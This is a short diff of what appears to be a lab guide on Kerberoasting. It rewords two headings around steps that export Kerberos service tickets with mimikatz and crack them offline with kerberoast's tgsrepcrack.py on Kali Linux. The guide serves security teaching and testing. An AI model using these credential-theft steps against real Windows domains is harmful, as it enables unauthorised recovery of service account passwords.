@@ -661,7 +661,7 @@ mimikatz # kerberos::list /export
    Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; ERROR kuhl_m_kerberos_list ; kull_m_file_writeData (0x00000005)
 ```
 
-### 3.1.3. Crack KRB_TGS to retrieve service account password (brute force)
+### 3.1.3. Creack the ticket to retrieve service account password (brute force)
 - Setup `kerberoast` on Kali Linux
 
 ```console
@@ -699,7 +699,7 @@ Setting up kerberoast (0~git20200516-0kali2) ...
 Processing triggers for kali-menu (2021.4.2) ...
 ```
 
-- Upload the dumped KRB_TGS and run the kerberoast brute force script
+- Run `tgsrepcrack.py` script
 
 ```console
 ┌──(kali㉿kali)-[~]
